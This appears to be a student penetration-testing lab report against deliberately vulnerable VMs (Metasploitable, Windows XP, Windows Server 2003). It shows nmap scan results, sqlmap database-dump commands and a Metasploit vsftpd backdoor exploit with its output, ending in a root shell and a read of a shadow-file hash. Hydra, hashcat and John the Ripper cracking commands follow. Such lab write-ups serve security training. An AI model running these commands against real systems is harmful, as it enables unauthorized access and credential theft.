# ЛР6

## nmap
```
# scanning for open ports
nmap -p- -O -sV 192.168.37.1/24

## nmap-vulscan

# installation
cd /usr/share/nmap/scripts/
git clone https://github.com/scipag/vulscan.git
ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan 
cd vulscan/utilities/updater/
chmod +x updateFiles.sh
./updateFiles.sh

# scanning cve
nmap --script vulscan/ --script-args vulscandb=cve.csv -sV -oN 101.txt $IP

# enumerate users
nmap -script smb-enum-users.nse -p 445 192.168.37.101

# enumerate auth methods supported
nmap --script ssh-auth-methods $IP
```

## metasploitable
* Link download metasploitable VM `https://sourceforge.net/projects/metasploitable/`
* Metasploitable/SSH/Exploits
`https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits`

* Metasploitable/NFS
`https://charlesreid1.com/wiki/Metasploitable/NFS`

* How to add a module to Metasploit from Exploit-DB
`https://kalinull.medium.com/how-to-add-a-module-to-metasploit-from-exploit-db-d389c2a33f6d`

* The best Beginner guide to hacking Metasploitable2 with Kali Linux
`https://www.youtube.com/playlist?list=PLEAkrOvgdk5RnMOqvQmMeAHl6UFJNiUcs`

* Vulnhub — Kiopitrix Level 1.2(#3) Write Up
`https://medium.com/@tnvo/vulnhub-kiopitrix-level-1-2-3-write-up-7147476d5efa`

### Opening ports
```                                          
PORT      STATE SERVICE     VERSION                                                          
21/tcp    open  ftp         vsftpd 2.3.4                                                     
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)                     
23/tcp    open  telnet      Linux telnetd                                                    
25/tcp    open  smtp        Postfix smtpd                                                    
53/tcp    open  domain      ISC BIND 9.4.2                                                   
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)                              
111/tcp   open  rpcbind     2 (RPC #100000)                                                  
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  shell       Netkit rshd
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
38446/tcp open  java-rmi    GNU Classpath grmiregistry
43675/tcp open  status      1 (RPC #100024)
57643/tcp open  mountd      1-3 (RPC #100005)
60712/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 00:0C:29:60:20:56 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80 exploitation
```
nikto -h $IP
# find the available databases:
sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1" — dbs
sqlmap -u "http://192.168.37.101/gallery/gallery.php?id=1” -p id — tables -D gallery
# dump all entries in the dev_account table:
sqlmap -u “http://192.168.37.101/gallery/gallery.php?id=1" -p id -T dev_accounts –dump

OR 

http://192.168.37.101
http://192.168.37.101/mutillidae/robots.txt
http://192.168.37.101/mutillidae/passwords
```

### Exploitng Port 21 FTP
```
# run postgresql sever
service postgresql start
# search for version of ftp server
msf6 > search vsftpd 2.3.4 
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.37.101
RHOSTS => 192.168.37.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.37.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.37.101:21 - USER: 331 Please specify the password.
[+] 192.168.37.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.37.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.37.105:45905 -> 192.168.37.101:6200) at 2022-11-24 20:44:32 +0300

whoami
root
sudo grep msfadmin /etc/shadow
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
```

## Cracking password
how to HACK a password // password cracking with Kali Linux and HashCat
`https://www.youtube.com/watch?v=z4_oqTZJqCo`
```
# using hydra for bruteforce-attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 41221
# using hashcat 
sudo hashcat -a 0 -m 500 hashes.txt /usr/share/wordlists/rockyou.txt 
# using john the ripper
john --format=md5crypt hashes.txt
```

## Windows XP
* Link download metasploitable VM `https://archive.org/details/WinXPProSP3Russian`

### Opening ports

```
PORT     STATE    SERVICE         VERSION
110/tcp  filtered pop3
135/tcp  open     msrpc           Microsoft Windows RPC
139/tcp  open     netbios-ssn     Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds    Microsoft Windows XP microsoft-ds
548/tcp  filtered afp
587/tcp  filtered submission
1025/tcp open     msrpc           Microsoft Windows RPC
1029/tcp filtered ms-lsa
1720/tcp filtered h323q931
1723/tcp filtered pptp
2717/tcp filtered pn-requester
5000/tcp open     upnp?
8081/tcp filtered blackice-icecap
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.93%I=2%D=11/26%Time=6381DAB9%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(RTSPRequest,1C,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
MAC Address: 00:0C:29:52:71:FE (VMware)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```
## Windows Server 2003
* Link download metasploitable VM `https://archive.org/details/WinServer2003EnterpriseEditionSP1RUS`

### Opening ports
```
PORT     STATE    SERVICE         VERSION
53/tcp   open     domain          Simple DNS Plus
88/tcp   open     kerberos-sec    Microsoft Windows Kerberos (server time: 2022-11-26 09:22:02Z)
135/tcp  open     msrpc           Microsoft Windows RPC
139/tcp  open     netbios-ssn     Microsoft Windows netbios-ssn
389/tcp  open     ldap            Microsoft Windows Active Directory LDAP (Domain: lab6.local, Site: Default-First-Site)
444/tcp  filtered snpp
445/tcp  open     microsoft-ds    Microsoft Windows 2003 or 2008 microsoft-ds
515/tcp  filtered printer
587/tcp  filtered submission
1025/tcp open     msrpc           Microsoft Windows RPC
1027/tcp open     ncacn_http      Microsoft Windows RPC over HTTP 1.0
1029/tcp filtered ms-lsa
3000/tcp filtered ppp
8000/tcp filtered http-alt
8081/tcp filtered blackice-icecap
MAC Address: 00:0C:29:9B:5E:FC (VMware)
Service Info: Host: DC-WIN2003; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
```